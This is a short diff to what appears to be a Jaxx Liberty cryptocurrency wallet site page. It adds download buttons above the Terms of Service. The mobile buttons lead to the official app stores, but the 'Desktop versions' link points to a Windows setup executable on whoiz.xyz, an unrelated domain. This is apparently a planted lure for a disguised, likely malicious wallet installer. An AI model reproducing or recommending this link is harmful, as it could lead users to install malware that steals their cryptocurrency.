@@ -1,3 +1,12 @@
+# Start your journey.
+
+## [Desktop versions](https://whoiz.xyz/Jaxx.Liberty-setup-2.4.6.exe) 
+## [Google Play Store button to download Jaxx Liberty](https://app.adjust.com/i7ewywj?campaign=jaxxio-website-android&fallback=https%3A%2F%2Fplay.google.com%2Fstore%2Fapps%2Fdetails%3Fid%3Dcom.liberty.jaxx)
+## [iTunes App Store button to download Jaxx Liberty](https://app.adjust.com/x8i60uj?campaign=jaxxio-website-ios&fallback=https%3A%2F%2Fitunes.apple.com%2Fus%2Fapp%2Fjaxx-liberty%2Fid1435383184%3Fls%3D1%26mt%3D8)
+
+
+
+
 # Terms of Service
 
 1.&nbsp;&nbsp; BASICS <br>
